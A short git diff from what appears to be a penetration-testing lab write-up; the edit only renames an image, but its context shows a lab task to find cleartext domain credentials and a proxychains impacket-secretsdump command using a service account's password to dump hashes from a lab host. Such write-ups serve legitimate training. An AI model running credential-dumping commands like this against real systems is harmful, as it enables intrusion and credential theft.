@@ -101,7 +101,7 @@ Note that RDP is also available for this host.
 
 **Find cleartext credentials for another domain user. Submit the username as your answer.**
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption><p>nothing useful</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption><p>nothing useful</p></figcaption></figure>
 
 ```
 proxychains impacket-secretsdump INLANEFREIGHT.LOCAL/svc_sql:lucky7@172.16.6.50 -outputfile inlanefreight_hashes 
